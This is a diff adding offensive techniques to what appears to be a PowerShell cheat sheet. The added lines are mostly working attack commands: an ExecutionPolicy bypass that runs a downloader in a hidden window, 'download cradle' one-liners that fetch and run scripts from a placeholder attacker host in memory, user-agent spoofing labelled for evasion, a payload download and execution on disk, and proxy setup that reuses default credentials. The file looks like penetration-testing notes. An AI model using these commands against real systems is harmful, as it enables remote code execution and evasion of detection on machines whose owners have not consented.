@@ -1,3 +1,6 @@
+# ExecutionPolicy Bypass and Hidden Window
+`powershell.exe -ExecutionPolicy bypass -Window hidden .\downloader.ps1`
+
 # Cmdlets
 `Get-ChildItem | Format-List *` | Get all named properties associated with the object (in this case Get-ChildItem)
 
@@ -72,4 +75,39 @@
 `$file = "C:\ProgramData\payload.exe"`
 `$webclient.DownloadFile($payload_url,$file)`
 
+#####################################
+# Download Cradle
+#####################################
+
+# From PS
+`iex (New-Object Net.Webclient).DownloadString("http://attacker_url/script.ps1")`
+# OR CMD Prompt
+`powershell.exe iex (New-Object Net.Webclient).DownloadString('http://attacker_url/script.ps1')`
+# OR
+
+# Memory Download 
+`$downloader = New-Object System.Net.WebClient`
+`$downloader.Headers.Add("user-agent", "Mozilla/5.0 (WIndows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36")` | Optional for evasion if abnormal header detected
+`$payload = "http://attacker_url/script.ps1"`
+`$command = $downloader.DownloadString($payload)`
+`Invoke-Expression $command`
+
+# Optional Memory Download && Execution
+`$req = [System.Net.WebRequest]::Create("http://attacker_URL/script.ps1")`
+`$res = $req.GetResponse()`
+`iex ([System.IO.StreamReader]($res.GetResponseStream())).ReadToEnd()`
+
+# Disk Download (Noisy and more likely to be detected)
+`$downloader = New-Object System.Net.WebClient`
+`$payload = "http://attacker_url/script.ps1"`
+`$local_file = "C:\Users\ryane\Documents\payload.exe`
+`$downloader.DownloadFile($payload,$local_file)`
+
+# Executing file once on target system
+`& $local_file` | & is the call operator
+
+# !!!USE THIS FOR PROXY!!!
+`$proxy = [Net.WebRequest]::GetSystemWebProxy()`
+`$proxy.Credentials = [Net.CredentialCache]::DefaultCredentials`
+`$downloader.Proxy = $proxy`
 
